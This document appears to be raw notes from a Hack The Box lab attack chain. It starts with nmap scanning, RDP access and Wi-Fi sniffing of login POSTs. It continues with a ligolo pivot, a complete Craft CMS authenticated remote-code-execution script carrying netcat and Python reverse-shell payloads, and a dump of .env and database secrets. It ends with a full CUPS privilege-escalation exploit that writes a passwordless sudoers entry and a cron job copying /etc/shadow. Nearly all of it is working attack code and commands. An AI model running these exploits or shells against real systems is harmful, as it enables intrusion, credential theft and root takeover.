nmap -p- --min-rate 1000 10.129.152.42 
nmap -sCV -p 22,3389 10.129.152.42
xfreerdp /v:10.129.152.42 /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution

contractor@airside-ws01:~$ uname -a
Linux airside-ws01 6.8.0-142-generic #142-Ubuntu SMP PREEMPT_DYNAMIC Wed Sep  2 14:24:27 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux

contractor@airside-ws01:~$ sudo -l
[sudo] password for contractor: 
Matching Defaults entries for contractor on airside-ws01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User contractor may run the following commands on airside-ws01:
    (ALL : ALL) ALL

contractor@airside-ws01:~$ sudo su
root@airside-ws01:/home/contractor# whoami
root

nc -lvnp 1337
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.218",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
Enter
Enter

reset
export TERM=xterm-256color

ip -br a
ip -d link show wlan2
ip -d link show wlan3
iw dev
rfkill list

ip link set dev wlan2 up
ip link set dev wlan3 up
ip -br a

sudo iw dev wlan2 scan
sudo iw dev wlan3 scan

sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip -br a show wlan
wlan2 UP 10.13.37.182/24

http://portal.international.htb/miles/

sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant 2>/dev/null; sudo killall wpa_supplicant 2>/dev/null
sudo ip link set wlan3 down
sudo iw dev wlan3 set type monitor
sudo ip link set wlan3 up
iw dev wlan3 info

sudo iw dev wlan3 set channel 6
iw dev wlan3 info
sudo tshark -i wlan3 -a duration:120 -Y 'http.request.method=="POST"' -T fields -e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
jenny,Fl1ghtDeck2026!

sudo ip tuntap add user "$(whoami)" mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert
certificate_fingerprint

uname -m
sudo apt update
sudo apt install ligolo-ng-common-binaries --fix-missing -y
cp /usr/share/ligolo-ng-common-binaries/ligolo-ng_agent_*_linux_amd64 .
python3 -m http.server 8000

wget http://10.10.16.218:8000/ligolo-ng_agent_0.9.1_linux_amd64 -O ligolo-agent
chmod +x ligolo-agent

certificate_fingerprint
./ligolo-agent -connect 10.10.16.218:11601 -accept-fingerprint 1F9EE4696B1EF5406E4205E2CAEF9E5CFF5C2AAA92FAA1FAF1096F75B88BC504 -ignore-cert

session
1
autoroute

ip -br a show viablewallflowe
ip route show dev viablewallflowe
ip route get 10.159.143.45
ping -c 3 10.159.143.45

sudo nano /etc/hosts
10.159.143.45   portal.international.htb wifi.international.htb

ss -lntp
State                 Recv-Q                Send-Q                                Local Address:Port                                 Peer Address:Port                Process                
LISTEN                0                     4096                                     127.0.0.54:53                                        0.0.0.0:*                                          
LISTEN                0                     4096                                  127.0.0.53%lo:53                                        0.0.0.0:*                                          
LISTEN                0                     4096                                        0.0.0.0:22                                        0.0.0.0:*                                          
LISTEN                0                     2                                                 *:3389                                            *:*                                          
LISTEN                0                     2                                             [::1]:3350                                         [::]:*                                          
LISTEN                0                     4096                                           [::]:22                                           [::]:*      

getent hosts portal.international.htb wifi.international.htb
10.13.37.10     portal.international.htb
10.13.37.1      wifi.international.ht

ip route get 10.13.37.10
10.13.37.10 via 10.159.143.1 dev eth0 src 10.159.143.45 uid 1001 
    cache 
ip route get 10.13.37.1
10.13.37.1 via 10.159.143.1 dev eth0 src 10.159.143.45 uid 1001 
    cache 


sudo nano /etc/hosts
#10.159.143.45   portal.international.htb wifi.international.htb
10.13.37.10     portal.international.htb
10.13.37.1      wifi.international.ht

ip route get 10.13.37.10
10.13.37.10 via 10.10.16.1 dev tun0 src 10.10.16.218 uid 1000 
    cache 

sudo ip route add 10.13.37.10/32 dev viablewallflowe
sudo ip route add 10.13.37.1/32 dev viablewallflowe

ip route get 10.13.37.10
10.13.37.10 dev viablewallflowe src 10.0.2.15 uid 1000 

ip route get 10.13.37.1 
10.13.37.1 dev viablewallflowe src 10.0.2.15 uid 1000

sudo systemctl start NetworkManager
sudo nmcli device set wlan2 managed yes
sudo nmcli radio wifi on
sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2
iw dev wlan2 link
ip -br addr show dev wlan2
ip route get 10.13.37.10

sudo systemctl unmask NetworkManager.service
sudo systemctl start NetworkManager.service
systemctl is-active NetworkManager.service
sudo nmcli device set wlan2 managed yes
sudo nmcli radio wifi on
sudo nmcli device wifi connect "HTB International WiFi" ifname wlan2

#now portal works from atk browser

iw dev wlan2 link && ip -br addr show dev wlan2 && ip route get 10.13.37.10 && curl -I --connect-timeout 5 http://portal.international.htb/miles/

curl -I --connect-timeout 5 http://portal.international.htb/miles/

gobuster dir -u http://portal.international.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50
/admin                (Status: 302) [Size: 0] [--> http://portal.international.htb/admin/login]
jenny.crawford@htb-international.htb
Craft CMS 5.9.8 
PHP version 	8.3.6
OS version 	Linux 6.8.0-142-generic
Database driver & version 	MariaDB 10.11.14
Image driver & version 	Imagick 3.7.0 (ImageMagick 6.9.12-98)
Craft edition & version 	Craft Solo 5.9.8
Yii version 	2.0.54
Twig version 	v3.21.1
Guzzle version 	7.14.2

nc -lvnp 4444
###
#!/usr/bin/env python3
"""Craft CMS authenticated RCE via condition-config (CVE-2026-72778 gadget,
GHSA-255j-qw47-wjh5). Run FROM KALI after the ligolo tunnel is up.
Reverse shell lands on the PIVOT host (airside-ws01 wlan2 IP)."""
import re, sys, requests
BASE  = "http://portal.international.htb"
USER  = "jenny"
PASS  = "Fl1ghtDeck2026!"
LHOST = "10.13.37.182"          # <-- airside-ws01 wlan2 address (listener lives here)
LPORT = 4444
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
AJAX = {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"}
# --- 1) login page + CSRF -------------------------------------------------
r = s.get(BASE + "/admin/login", timeout=10)
m = re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', r.text.replace('\\"', '"'))
if not m:
    sys.exit("[-] no CSRF token on login page - is the tunnel/hosts entry up?")
csrf = m.group(1)
# --- 2) login (JSON body, like the CP's own JS) ---------------------------
lr = s.post(BASE + "/index.php?p=admin/actions/users/login",
            json={"CRAFT_CSRF_TOKEN": csrf, "loginName": USER, "password": PASS},
            headers={**AJAX, "X-CSRF-Token": csrf}, timeout=10)
dash = s.get(BASE + "/admin/dashboard", timeout=10)
if dash.status_code != 200 or "loginName" in dash.text[:2000]:
    sys.exit(f"[-] login failed (HTTP {lr.status_code}): check creds")
print("[+] logged in as", USER)
# --- 3) fresh CSRF from the CP --------------------------------------------
m2 = (re.search(r'csrfTokenValue":"([^"]+)"', dash.text)
      or re.search(r'name="CRAFT_CSRF_TOKEN"\s+value="([^"]+)"', dash.text.replace('\\"', '"')))
if not m2:
    sys.exit("[-] could not read CP CSRF token")
csrf2 = m2.group(1)
# --- 4) the gadget ---------------------------------------------------------
def payload(cmd):
    return {
        "elementType": "craft\\elements\\Category",
        "siteId": 1,
        "search": "",
        "condition": {
            "class": "craft\\elements\\conditions\\ElementCondition",
            "elementType": "craft\\elements\\Category",
            "fieldLayouts": [{
                "as rce": {                                   # attach Yii Behavior
                    "__class": "yii\\behaviors\\AttributeTypecastBehavior",
                    "__construct()": [{
                        "attributeTypes": {
                            "typecastBeforeSave": ["Psy\\Readline\\Hoa\\ConsoleProcessus", "execute"]
                        },
                        "typecastBeforeSave": cmd             # argument = our command
                    }]
                },
                "on *": "self::beforeSave"                    # fire on ANY event
            }]
        },
        "CRAFT_CSRF_TOKEN": csrf2,
    }
shells = [
    f"busybox nc {LHOST} {LPORT} -e /bin/sh",
    f"ncat {LHOST} {LPORT} -e /bin/sh",
    f"nc {LHOST} {LPORT} -e /bin/sh",
    (f"python3 -c 'import socket,subprocess,os;s=socket.socket();"
     f"s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);"
     f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
     f"subprocess.call([\"/bin/bash\",\"-i\"])'"),
]
for cmd in shells:
    try:
        pr = s.post(BASE + "/index.php?p=admin/actions/element-search/search",
                    json=payload(cmd), headers={**AJAX, "X-CSRF-Token": csrf2}, timeout=8)
        print(f"[*] sent ({pr.status_code}): {cmd[:60]}")
    except requests.exceptions.Timeout:
        # the PHP process is busy running OUR shell -> socket hangs = SUCCESS
        print(f"[+] timeout (shell probably running): {cmd[:60]}")
        break
print("[*] check your listener on the pivot host")

###
python3 exploit.py

whoami
www-data

cat .env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--41606de1-cf7a-4fc5-8b1e-6f746d801adf

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=production

# General settings
CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DEV_MODE=false
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_DISALLOW_ROBOTS=true

CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://portal.international.htb/
CRAFT_ENABLE_TWIG_SANDBOX=true

mysql -u craftuser -p'CraftDB_pw_2026' craft -e "SELECT name, value FROM htbairways_settings;"
aporter:u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=

php craft exec "echo Craft::\$app->security->decryptByKey(base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=')), PHP_EOL;"
aporter:Skyp0rt_Relay!26
su aporter

sudo -l
find / -perm -4000 -type f 2>/dev/null
ss -tulpn

aporter@portal:/var/www/portal/web$ ss -tulnp
ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0         127.0.0.54:53        0.0.0.0:*          
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
tcp   LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*          
tcp   LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*          
tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:631       0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*          
tcp   LISTEN 0      511             [::]:80           [::]:*          
tcp   LISTEN 0      4096            [::]:22           [::]:*          
tcp   LISTEN 0      4096           [::1]:631          [::]:* 

cups-config --version
2.4.16

#!/usr/bin/env python3
"""
CVE-2026-34990 — CUPS local privilege escalation (cups2root, de-harnessed)
"""

import getpass, gzip, os, socket, struct, subprocess, sys, threading, time

ATTACKER = os.environ.get("ATTACKER") or getpass.getuser()
CAPTURE_HOST, CAPTURE_PORT = os.environ.get("CAPTURE_HOST", "127.0.0.1"), int(os.environ.get("CAPTURE_PORT", "9189"))
IPP_HOST, IPP_PORT = os.environ.get("IPP_HOST", "127.0.0.1"), int(os.environ.get("IPP_PORT", "631"))
SUDOERS_PATH = os.environ.get("SUDOERS_PATH", f"/etc/sudoers.d/{ATTACKER}-pwn")
CRON_PATH = os.environ.get("CRON_PATH", f"/etc/cron.d/{ATTACKER}-pwn")

T_OP, T_PRINTER, T_END = 0x01, 0x04, 0x03
T_INT, T_BOOL, T_NAME, T_KEYWORD = 0x21, 0x22, 0x42, 0x44
T_URI, T_CHARSET, T_LANG, T_MIME = 0x45, 0x47, 0x48, 0x49
OP_PRINT_JOB, OP_RESUME_PRINTER = 0x0002, 0x0011
OP_ADD_MODIFY_PRINTER, OP_ACCEPT_JOBS, OP_CREATE_LOCAL_PRINTER = 0x4003, 0x4008, 0x4028

def a(tag, name, val):
    n, v = name.encode(), val.encode()
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v

def a_raw(tag, name, v):
    n = name.encode()
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v

def ab(name, val):
    return a_raw(T_BOOL, name, b"\x01" if val else b"\x00")

def req(op, rid, oa, pa=None, doc=b""):
    p = bytearray(struct.pack(">BBHI", 2, 0, op, rid))
    p.append(T_OP)
    for x in oa:
        p.extend(x)
    if pa:
        p.append(T_PRINTER)
        for x in pa:
            p.extend(x)
    p.append(T_END)
    p.extend(doc)
    return bytes(p)

def post(res, body, auth=None, timeout=4.0):
    h = [f"POST {res} HTTP/1.1", f"Host: {IPP_HOST}:{IPP_PORT}",
         "Content-Type: application/ipp", f"Content-Length: {len(body)}",
         "Connection: close"]
    if auth:
        h.append(f"Authorization: Local {auth}")
    r = ("\r\n".join(h) + "\r\n\r\n").encode("latin1") + body
    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(r)
        buf = bytearray()
        while b"\r\n\r\n" not in buf:
            c = s.recv(65536)
            if not c:
                break
            buf.extend(c)
        hh, _, rest = bytes(buf).partition(b"\r\n\r\n")
        cl = 0
        for ln in hh.split(b"\r\n"):
            if ln.lower().startswith(b"content-length:"):
                cl = int(ln.split(b":", 1)[1].strip())
        pl = bytearray(rest)
        while len(pl) < cl:
            c = s.recv(65536)
            if not c:
                break
            pl.extend(c)
        sl = hh.split(b"\r\n", 1)[0].split()
        return (int(sl[1]) if len(sl) > 1 else 0), bytes(pl[:cl] if cl else pl)

def st(p):
    return struct.unpack(">H", p[2:4])[0] if len(p) >= 4 else -1

def common():
    return [a(T_CHARSET, "attributes-charset", "utf-8"),
            a(T_LANG, "attributes-natural-language", "en"),
            a(T_NAME, "requesting-user-name", ATTACKER)]

def admin(tok, op, rid, name, pa=None):
    c, p = post("/admin/", req(op, rid, common() + [a(T_URI, "printer-uri",
                                                      f"ipp://localhost:{IPP_PORT}/printers/{name}")], pa), auth=tok)
    return c, st(p)

def print_job(name, rid, payload):
    c, p = post(f"/printers/{name}", req(OP_PRINT_JOB, rid, common() + [
        a(T_URI, "printer-uri", f"ipp://localhost:{IPP_PORT}/printers/{name}"),
        a(T_MIME, "document-format", "application/vnd.cups-raw"),
        a(T_KEYWORD, "compression", "gzip"),
        a(T_NAME, "job-name", "pwn")], doc=gzip.compress(payload)))
    return c, st(p)

class Cap(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.port, self.token = port, None

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((CAPTURE_HOST, self.port))
            s.listen(5)
            s.settimeout(0.2)
            end = time.time() + 25
            while time.time() < end and not self.token:
                try:
                    c, _ = s.accept()
                except socket.timeout:
                    continue
                with c:
                    d = b""
                    c.settimeout(5)
                    while b"\r\n\r\n" not in d:
                        x = c.recv(4096)
                        if not x:
                            break
                        d += x
                    tok = None
                    for ln in d.decode("latin1", "replace").splitlines():
                        if ln.lower().startswith("authorization: local "):
                            tok = ln.split(None, 2)[2]
                    if tok:
                        self.token = tok
                        ipp = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                               b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                               b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\nContent-Length: " +
                                  str(len(ipp)).encode() + b"\r\nConnection: close\r\n\r\n" + ipp)
                    else:
                        c.sendall(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Local trc=\"y\"\r\n"
                                  b"Content-Length: 0\r\nConnection: close\r\n\r\n")

def drop(tok, tag, path, payload, tries=12):
    for i in range(tries):
        name = f"{tag}{i}{time.time_ns() % 100000}"
        c, s = admin(tok, OP_ADD_MODIFY_PRINTER, 100 + i, name, [
            a(T_URI, "device-uri", f"file://{path}"),
            a(T_NAME, "printer-name", name),
            a(T_NAME, "ppd-name", "raw"),
            ab("printer-is-temporary", False),
            ab("printer-is-accepting-jobs", True),
            a_raw(T_INT, "printer-state", struct.pack(">i", 3)),
        ])
        admin(tok, OP_ACCEPT_JOBS, 300 + i, name)
        admin(tok, OP_RESUME_PRINTER, 400 + i, name)
        pc, ps = print_job(name, 500 + i, payload)
        print(f"  [{tag}] queue add 0x{s:04x} / print HTTP {pc} 0x{ps:04x}", flush=True)
        time.sleep(1.0)

def is_root():
    r = subprocess.run(["sudo", "-n", "/bin/sh", "-c", "id"], capture_output=True, text=True)
    return r.returncode == 0, (r.stdout + r.stderr).strip()

def leak_token():
    cap = Cap(CAPTURE_PORT)
    cap.start()
    time.sleep(0.4)
    body = req(OP_CREATE_LOCAL_PRINTER, 3, common() + [
        a(T_URI, "printer-uri", f"ipp://localhost:{IPP_PORT}/")], [
        a(T_NAME, "printer-name", "tokenleak"),
        a(T_URI, "device-uri", f"ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print")])
    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
    s = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4)
    s.sendall(raw)
    s.settimeout(2)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.close()
    cap.join(timeout=20)
    return cap.token

def main():
    print("CVE-2026-34990 — CUPS local privilege escalation (cups2root, de-harnessed)")
    print(f"[*] target user = {ATTACKER} :: cupsd = {IPP_HOST}:{IPP_PORT}")
    tok = leak_token()
    if not tok:
        print("[-] no token captured — is cupsd running as root and reachable?")
        return 1
    print(f"[+] Local token: {tok}", flush=True)

    print("[*] step 1: write sudoers fragment", flush=True)
    drop(tok, "sw", SUDOERS_PATH, f"{ATTACKER} ALL=(ALL) NOPASSWD: ALL\n".encode())
    ok, out = is_root()
    print(f"[*] sudo -n id -> rc_ok={ok} :: {out}", flush=True)
    if ok:
        print("[+] ROOT via sudoers", flush=True)
        return 0

    print("[*] step 2: fallback /etc/cron.d", flush=True)
    drop(tok, "cw", CRON_PATH,
         f"* * * * * root cp /etc/shadow /tmp/shadow-{ATTACKER} 2>/dev/null; "
         f"chmod 644 /tmp/shadow-{ATTACKER}\n".encode())
    print("[*] waiting up to 90s for cron ...", flush=True)
    for _ in range(90):
        ok, out = is_root()
        if ok:
            print("[+] ROOT via sudoers (delayed)", flush=True)
            return 0
        if subprocess.run(["test", "-f", f"/tmp/shadow-{ATTACKER}"]).returncode == 0:
            print(f"[+] cron payload executed (root-owned /tmp/shadow-{ATTACKER})", flush=True)
            return 0
        time.sleep(1)
    print("[-] no root yet — window closed or system patched", flush=True)
    return 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)

sudo su -
